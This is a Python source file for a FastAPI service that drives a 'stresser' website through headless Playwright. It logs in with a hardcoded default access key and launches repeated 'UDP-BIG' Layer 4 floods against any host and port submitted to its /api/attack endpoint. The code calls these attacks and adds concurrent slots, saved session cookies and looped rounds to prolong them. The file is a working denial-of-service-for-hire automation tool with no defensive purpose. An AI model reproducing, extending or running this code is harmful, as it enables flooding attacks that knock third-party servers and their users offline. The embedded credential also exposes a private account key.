#!/usr/bin/env python3
"""
RETRO//STRESS Localhost REST API Service - Multi-Slot Concurrent Edition
High-performance REST API built with FastAPI and Playwright.
Clean responses without internal method/rounds/cycle prints.
"""

import json
import math
import os
import random
import threading
import time
from typing import Optional, List
from dotenv import load_dotenv
from fastapi import FastAPI, Query, HTTPException
from pydantic import BaseModel, Field
import uvicorn
from playwright.sync_api import sync_playwright

# ----------------- LOAD ENVIRONMENT VARIABLES -----------------
load_dotenv()

raw_keys = os.environ.get("RETROSTRESS_KEYS", "").strip()
if not raw_keys:
    single_key = os.environ.get(
        "RETROSTRESS_KEY",
        "usr_9erY2GRdpkiEoaceRXZOe_ua77M0pAJM"
    ).strip()
    RETROSTRESS_KEYS = [single_key] if single_key else []
else:
    RETROSTRESS_KEYS = [k.strip() for k in raw_keys.split(",") if k.strip()]

BASE = "https://retrostress.net"
LOGIN_URL = BASE + "/login"
PANEL_URL = BASE + "/panel"

try:
    CYCLE_DURATION = int(os.environ.get("CYCLE_DURATION", "30").strip())
except ValueError:
    CYCLE_DURATION = 30

# ----------------- MULTI-SLOT POOL MANAGEMENT -----------------
slots_lock = threading.Lock()
slots = []

for idx, key in enumerate(RETROSTRESS_KEYS, start=1):
    slots.append({
        "id": idx,
        "key": key,
        "running": False,
        "stop_requested": False,
        "target": None,
        "start_time": None,
        "cookie_file": f"session_slot_{idx}.json"
    })

# ----------------- FASTAPI APP INITIALIZATION -----------------
app = FastAPI(
    title="REST API Controller",
    description="Localhost REST API server for multi-slot concurrent controller.",
    version="2.1.0"
)

# ----------------- HELPER FUNCTIONS -----------------

def stable_click(page, handle, retries=5, wait=300):
    for _ in range(retries):
        try:
            handle.click()
            return True
        except Exception:
            page.wait_for_timeout(wait)
    return False


def wait_for_panel_ready(page, timeout=20):
    try:
        page.wait_for_selector(
            "#test-url, input[placeholder*='1.2.3.4'], button.app-method-trigger, button:has-text('Start test')",
            timeout=timeout * 1000
        )
    except Exception:
        pass
    page.wait_for_timeout(1000)


def select_layer4(page):
    l4_btn = page.query_selector(
        "button:has-text('Layer 4'), button:has-text('Network endpoint'), button.ct-pill:has-text('UDP')"
    )
    if l4_btn:
        stable_click(page, l4_btn)
        page.wait_for_timeout(600)


def fill_target(page, ip, port):
    ip_field = page.query_selector(
        "#test-url, input[placeholder*='1.2.3.4'], input.ct-mono[type='text'], input[type='text']"
    )
    if ip_field:
        ip_field.fill(ip)
        page.wait_for_timeout(200)
    else:
        raise RuntimeError("Could not find Target IP input field.")

    num_inputs = page.query_selector_all("input[type='number'], input.ct-mono[type='number']")
    if num_inputs:
        num_inputs[0].fill(str(port))
        page.wait_for_timeout(200)


def select_method(page, target="UDP-BIG"):
    trigger = page.query_selector(
        "button.app-method-trigger, button.ct-combo-trigger, button:has-text('Browse methods'), button:has-text('Available methods')"
    )
    if trigger:
        stable_click(page, trigger)
        page.wait_for_timeout(600)

        udp_filters = [b for b in page.query_selector_all("button") if b.inner_text().strip() == "UDP"]
        if udp_filters:
            stable_click(page, udp_filters[0])
            page.wait_for_timeout(400)

        exact_items = [el for el in page.query_selector_all("button, div, span") if el.inner_text().strip() == target]
        if exact_items:
            stable_click(page, exact_items[0])
            page.wait_for_timeout(600)
            return

        method_candidates = page.query_selector_all("button, .app-method-item, .ct-combo-item")
        for item in method_candidates:
            text = item.inner_text().strip()
            if target in text:
                if stable_click(page, item):
                    page.wait_for_timeout(600)
                    return
        page.keyboard.press("Escape")
        page.wait_for_timeout(300)


def pick_random_country(page):
    trigger = page.query_selector(
        "button.app-location-trigger, button.ct-combo-trigger:nth-of-type(2), button:has-text('Worldwide')"
    )
    if trigger:
        stable_click(page, trigger)
        page.wait_for_timeout(600)

        exclude_keywords = [
            "Worldwide", "AMPLIFICATION", "UDP", "TCP", "GAME", "OTHER", "Other",
            "All", "Schedule", "Start test", "New test", "Chains", "Scheduled",
            "Menu", "âª", "+", "â", "Layer", "Website", "Network", "Browse methods",
            "Available methods", "HTTP"
        ]

        items = []
        for b in page.query_selector_all("button, .ct-combo-item"):
            text = b.inner_text().strip()
            if not text or len(text) < 2:
                continue
            if any(k in text for k in exclude_keywords):
                continue
            items.append((b, text))

        if items:
            choice_btn, choice_label = random.choice(items)
            stable_click(page, choice_btn)
            page.wait_for_timeout(600)
            page.keyboard.press("Escape")
            page.wait_for_timeout(200)
            return choice_label.replace("\n", " ")
        else:
            page.keyboard.press("Escape")
    return "Worldwide"


# ----------------- ATTACK EXECUTION WORKER -----------------

def run_slot_worker(slot_id: int, ip: str, port: int, duration: int):
    slot = next((s for s in slots if s["id"] == slot_id), None)
    if not slot:
        return

    total_rounds = max(1, math.ceil(duration / CYCLE_DURATION))

    with slots_lock:
        slot["running"] = True
        slot["stop_requested"] = False
        slot["target"] = f"{ip}:{port}"
        slot["start_time"] = time.time()

    print(f"\n[ð SLOT #{slot_id}] Attack Started -> Target: {ip}:{port} | Duration: {duration}s")

    try:
        with sync_playwright() as p:
            browser = None
            for channel in ["msedge", "chrome", None]:
                try:
                    if channel:
                        browser = p.chromium.launch(channel=channel, headless=True)
                    else:
                        browser = p.chromium.launch(headless=True)
                    if browser:
                        break
                except Exception:
                    continue

            if not browser:
                raise RuntimeError(f"Slot #{slot_id}: Failed to launch Chromium browser.")

            context = browser.new_context(viewport={"width": 1440, "height": 1000})
            page = context.new_page()

            logged_in = False
            cookie_file = slot["cookie_file"]
            if os.path.exists(cookie_file):
                try:
                    with open(cookie_file, "r", encoding="utf-8") as fh:
                        data = json.load(fh)
                    context.add_cookies(data.get("cookies", []))
                    page.goto(PANEL_URL, wait_until="domcontentloaded", timeout=40000)
                    wait_for_panel_ready(page, 20)
                    if "/login" not in page.url:
                        logged_in = True
                except Exception:
                    pass

            if not logged_in:
                login_key = slot["key"]
                if not login_key:
                    print(f"[â SLOT #{slot_id}] No access key configured for this slot.")
                    browser.close()
                    return

                page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=40000)
                page.wait_for_timeout(1000)
                page.fill("#access-key", login_key)
                page.click("button[type='submit']")
                page.wait_for_timeout(4000)

                try:
                    with open(cookie_file, "w", encoding="utf-8") as fh:
                        json.dump({"site": BASE, "cookies": context.cookies()}, fh, indent=2)
                except Exception:
                    pass

                page.goto(PANEL_URL, wait_until="domcontentloaded", timeout=40000)
                wait_for_panel_ready(page, 20)

            for r in range(1, total_rounds + 1):
                if slot["stop_requested"]:
                    print(f"[ð SLOT #{slot_id}] Stopped by user!")
                    break

                select_layer4(page)
                fill_target(page, ip, port)
                select_method(page, "UDP-BIG")
                pick_random_country(page)

                launch_btn = page.query_selector(
                    "button.button.primary:has-text('Start test'), button:has-text('Start test')"
                )
                if not launch_btn:
                    break

                stable_click(page, launch_btn)
                page.wait_for_timeout(3000)

                for _ in range(CYCLE_DURATION // 5):
                    if slot["stop_requested"]:
                        break
                    time.sleep(5)

                if slot["stop_requested"]:
                    print(f"[ð SLOT #{slot_id}] Stopped by user.")
                    break

                if r < total_rounds:
                    time.sleep(2)
                    page.goto(PANEL_URL, wait_until="domcontentloaded", timeout=40000)
                    wait_for_panel_ready(page, 20)

            browser.close()
            print(f"[â SLOT #{slot_id}] Attack finished for {ip}:{port}.")

    except Exception as e:
        print(f"[â SLOT #{slot_id} Error] {str(e)}")

    finally:
        with slots_lock:
            slot["running"] = False
            slot["target"] = None
            slot["start_time"] = None


# ----------------- PYDANTIC SCHEMAS -----------------

class AttackRequest(BaseModel):
    host: str = Field(..., description="Target IP or Domain (e.g. 1.2.3.4)")
    port: int = Field(80, description="Target Port number (e.g. 80, 443, 53)")
    time: int = Field(60, description="Duration in seconds (e.g. 60, 120)")


class StopRequest(BaseModel):
    slot_id: Optional[int] = Field(None, description="Specific Slot ID to stop (leave empty for all)")


# ----------------- API ROUTES -----------------

@app.get("/")
def root():
    return {
        "status": "online",
        "service": "REST API Controller",
        "total_slots": len(slots),
        "docs_url": "/docs",
        "endpoints": {
            "launch_attack_post": "POST /api/attack",
            "launch_attack_get": "GET /api/attack?host=...&port=...&time=...",
            "status": "GET /api/status",
            "slots": "GET /api/slots",
            "stop_post": "POST /api/stop",
            "stop_get": "GET /api/stop?slot=..."
        }
    }


def _execute_attack_request(host: str, port: int, duration: int):
    if not host or not host.strip():
        raise HTTPException(status_code=400, detail="Host IP/domain cannot be empty.")
    if port < 1 or port > 65535:
        raise HTTPException(status_code=400, detail="Invalid port number (1-65535).")
    if duration < 10:
        duration = 10

    assigned_slot = None
    with slots_lock:
        for slot in slots:
            if not slot["running"]:
                slot["running"] = True
                assigned_slot = slot
                break

    if not assigned_slot:
        raise HTTPException(
            status_code=503,
            detail=f"All slots are currently busy ({len(slots)}/{len(slots)}). Please wait or stop a slot."
        )

    t = threading.Thread(
        target=run_slot_worker,
        args=(assigned_slot["id"], host.strip(), port, duration),
        daemon=True
    )
    t.start()

    return {
        "success": True,
        "message": "Attack initiated successfully",
        "data": {
            "slot_id": assigned_slot["id"],
            "target": f"{host.strip()}:{port}",
            "duration": duration
        }
    }


@app.post("/api/attack")
def api_attack_post(req: AttackRequest):
    return _execute_attack_request(req.host, req.port, req.time)


@app.get("/api/attack")
def api_attack_get(
    host: str = Query(..., description="Target IP or Domain"),
    port: int = Query(80, description="Target Port"),
    time: int = Query(60, description="Duration in seconds")
):
    return _execute_attack_request(host, port, time)


@app.get("/api/status")
@app.get("/api/slots")
def api_status():
    with slots_lock:
        slots_data = []
        active_count = 0
        for slot in slots:
            is_running = slot["running"]
            if is_running:
                active_count += 1
            
            elapsed = int(time.time() - slot["start_time"]) if slot["start_time"] else 0
            
            slots_data.append({
                "slot_id": slot["id"],
                "status": "BUSY" if is_running else "IDLE",
                "running": is_running,
                "target": slot["target"],
                "elapsed_seconds": elapsed
            })

    return {
        "total_slots": len(slots),
        "active_slots": active_count,
        "available_slots": len(slots) - active_count,
        "slots": slots_data
    }


def _execute_stop(slot_id: Optional[int] = None):
    stopped_slots = []
    with slots_lock:
        if slot_id is not None:
            slot = next((s for s in slots if s["id"] == slot_id), None)
            if slot and slot["running"]:
                slot["stop_requested"] = True
                stopped_slots.append(slot["id"])
        else:
            for slot in slots:
                if slot["running"]:
                    slot["stop_requested"] = True
                    stopped_slots.append(slot["id"])

    return {
        "success": True,
        "stopped_count": len(stopped_slots),
        "stopped_slots": stopped_slots,
        "message": f"Stop signal sent to {len(stopped_slots)} slot(s)." if stopped_slots else "No running slots found."
    }


@app.post("/api/stop")
def api_stop_post(req: Optional[StopRequest] = None):
    slot_id = req.slot_id if req else None
    return _execute_stop(slot_id)


@app.get("/api/stop")
def api_stop_get(slot: Optional[int] = Query(None, description="Optional Slot ID to stop")):
    return _execute_stop(slot)


# ----------------- MAIN SERVER RUNNER -----------------

if __name__ == "__main__":
    host = os.environ.get("API_HOST", "0.0.0.0")
    port = int(os.environ.get("API_PORT", "3000"))

    print("\n" + "=" * 60)
    print(" ð REST API Server Starting!")
    print(f" ð Host: http://{host}:{port}")
    print(f" ð Interactive Docs: http://localhost:{port}/docs")
    print(f" â¡ Total Slots: {len(slots)}")
    print("=" * 60 + "\n")

    uvicorn.run(app, host=host, port=port)